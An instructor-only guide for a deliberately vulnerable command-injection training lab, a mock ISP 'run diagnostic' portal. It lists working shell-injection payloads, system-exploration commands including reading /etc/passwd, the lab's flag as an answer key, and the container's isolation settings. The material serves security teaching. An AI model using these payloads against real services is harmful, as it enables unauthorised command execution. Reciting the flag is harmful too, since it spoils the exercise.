# cmdi-netcheck — NetCheck GH Command Injection Lab

**FOR INSTRUCTOR USE ONLY — Do not share this file with students.**

---

## Overview

A deliberately vulnerable Ghanaian ISP self-service portal. The backend passes
the user-supplied `host` parameter directly into a shell command string with
`shell=True` and no sanitization. Any shell metacharacter injected into the
input will be executed by `/bin/sh` and its output reflected back in the
diagnostic results.

**Flag:** `CYBERSIM{c0mm4nd_1nj3ct10n_ch4mp10n_2026}`  
**Flag path inside container:** `/opt/netcheck/flag.txt`  
**Decoy path (no flag):** `/etc/netcheck/config.yml`

---

## Working Payloads

All payloads assume the form field value is submitted via `POST /run-diagnostic`
or via the query string `GET /run-diagnostic?host=<payload>`.

### 1. Semicolon chaining (most reliable, easiest to read)
```
127.0.0.1; cat /opt/netcheck/flag.txt
```
Executes `ping -c 4 127.0.0.1` **and then** `cat /opt/netcheck/flag.txt`.
Both command outputs appear in the result block.

### 2. AND operator (runs second command only if ping succeeds)
```
127.0.0.1 && cat /opt/netcheck/flag.txt
```
Since `127.0.0.1` will succeed (loopback ping), the flag is printed.

### 3. Pipe (feeds ping stdout to cat — cat ignores stdin from a pipe and reads the file)
```
127.0.0.1 | cat /opt/netcheck/flag.txt
```
`cat` treats its argument as a filename, not stdin, so the flag is printed
regardless of what ping produces on stdout.

### 4. Backtick substitution
```
127.0.0.1 `cat /opt/netcheck/flag.txt`
```
The backtick expression is evaluated by the shell and its output is injected
into the ping argument list. Ping fails with an invalid address error, but the
flag is printed as part of the error because the flag string appears in the
command line that gets echoed. More useful as a verification that substitution
works; prefer `;` or `&&` for clean output.

### 5. `$()` command substitution
```
127.0.0.1 $(cat /opt/netcheck/flag.txt)
```
Same behaviour as backticks. The shell evaluates the subshell and substitutes
the flag string into the argument, triggering a ping error that includes it.

### 6. Out-of-band exploration first
Before reading the flag, a student would naturally run these to explore:
```
; whoami           → netcheck
; id               → uid=...(netcheck) gid=...(netcheck)
; ls /             → bin  dev  etc  home  lib  opt  proc  ...
; ls /opt          → netcheck
; ls /opt/netcheck → flag.txt
; cat /etc/netcheck/config.yml  → decoy ISP config (no flag)
; cat /etc/passwd  → shows system users including netcheck
; find / -name "*.txt" 2>/dev/null  → discovers /opt/netcheck/flag.txt
```

---

## Container Architecture

| Property | Value |
|---|---|
| Base image | `python:3.12-slim` |
| Process user | `netcheck` (non-root, UID auto-assigned) |
| Flag path | `/opt/netcheck/flag.txt` |
| Decoy config | `/etc/netcheck/config.yml` |
| App port | `8000` |
| Health endpoint | `GET /health → {"ok": true}` |

---

## Security Containment

The lab manager applies the following constraints to **all** lab containers,
including this one:

| Control | Value | Effect |
|---|---|---|
| `CapDrop` | `ALL` | Drops all Linux capabilities — student shell cannot mount filesystems, change UIDs, open raw sockets, etc. |
| `SecurityOpt` | `no-new-privileges:true` | Prevents `setuid` / `setgid` escalation |
| Docker network | Internal bridge (`Internal: true`) | No internet egress from inside the container |
| Memory | 256 MB | Prevents fork-bomb / resource exhaustion |
| NanoCpus | 500 000 000 (0.5 cores) | CPU throttle |
| PidsLimit | 128 | Limits process spawning |
| Non-root user | `netcheck` | Even with full shell access, student is not root |

**Verified isolation checks:**
- `curl https://example.com` inside the container → connection refused / timeout (Internal network, no internet routing)
- `ping <docker-host-ip>` → works if host is reachable on the bridge, but no capabilities to do anything meaningful
- `sudo` / `su` → not installed; no PATH escalation possible
- Container can **not** reach another student's container because each instance
  gets its own isolated `gcs_<instanceId>` bridge network

---

## Building and Testing Locally

```bash
# Build
docker build -t ghana-cybersim/cmdi-netcheck:latest labs/cmdi-netcheck/

# Smoke test (health)
docker run --rm -p 8001:8000 ghana-cybersim/cmdi-netcheck:latest &
curl http://localhost:8001/health
# → {"ok":true}

# Exploit test
curl -s -X POST http://localhost:8001/run-diagnostic \
  --data-urlencode 'host=127.0.0.1; cat /opt/netcheck/flag.txt' \
  | grep -o 'CYBERSIM{[^<]*}'
# → CYBERSIM{c0mm4nd_1nj3ct10n_ch4mp10n_2026}

# Verify non-root
curl -s -X POST http://localhost:8001/run-diagnostic \
  --data-urlencode 'host=127.0.0.1; whoami' | grep netcheck
# → netcheck

# Verify no capabilities
docker run --rm --cap-drop=ALL ghana-cybersim/cmdi-netcheck:latest \
  python -c "import subprocess; print(subprocess.getoutput('cat /proc/self/status | grep Cap'))"
```
